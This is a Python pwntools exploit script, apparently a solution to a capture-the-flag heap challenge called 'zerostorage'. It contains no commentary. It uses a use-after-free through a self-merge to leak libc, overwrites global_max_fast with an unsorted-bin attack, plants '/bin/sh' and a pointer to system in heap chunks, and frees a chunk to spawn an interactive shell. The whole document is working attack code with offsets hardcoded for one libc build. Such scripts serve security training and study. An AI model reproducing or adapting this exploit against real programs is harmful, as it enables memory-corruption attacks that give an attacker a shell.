#!/usr/bin/env python2

import sys,os
from pwn import *

context.update(arch="amd64", endian="little", os="linux", )

TARGET=os.path.realpath("zerostorage")

def insert(data):
    r.sendlineafter("choice: ", "1")
    r.sendlineafter("entry: ",str(len(data)))
    r.sendafter("data: ",data)

def update(idx, data):
    r.sendlineafter("choice: ","2")
    r.sendlineafter("ID: ",str(idx))
    r.sendlineafter("entry: ",str(len(data)))
    r.sendafter("data: ",data)

def merge(fidx, tidx):
    r.sendlineafter("choice: ","3")
    r.sendlineafter("ID: ",str(fidx))
    r.sendlineafter("ID: ",str(tidx))

def delete(idx):
    r.sendlineafter("choice: ","4")
    r.sendlineafter("ID: ",str(idx))

def view(idx):
    r.sendlineafter("choice: ","5")
    r.sendlineafter("ID: ",str(idx))

def list(idx):
    r.sendlineafter("choice: ","6")


def exploit(r):

    insert("A"*0x20) #0
    insert("B"*0xf8) #1
    merge(0,0) #2
    view(2)
    r.recvline()
    libcbase = u64(r.recv(8))-0x3c4b78
    max_fast_addr = libcbase + 0x3c67f8
    log.success("Libc base at {}".format(hex(libcbase)))
    update(2,p64(libcbase+0x3c4b78)+p64(max_fast_addr-16))
    insert("G"*20)
    merge(1,1)
    payload = p64(libcbase+0x3c674f)
    payload += "A"*(496-len(payload))
    update(3,payload)
    payload = "/bin/sh\x00"
    payload += "\x00"*(496-len(payload))
    insert(payload)
    
    payload = "\x00"*73
    payload += p64(libcbase+0x45390)
    payload += "\x00"*(496-len(payload))
    insert(payload)

    delete(1)

    r.interactive()
    return

if __name__ == "__main__":

    r = process([TARGET,],)
    exploit(r)
    sys.exit(0)
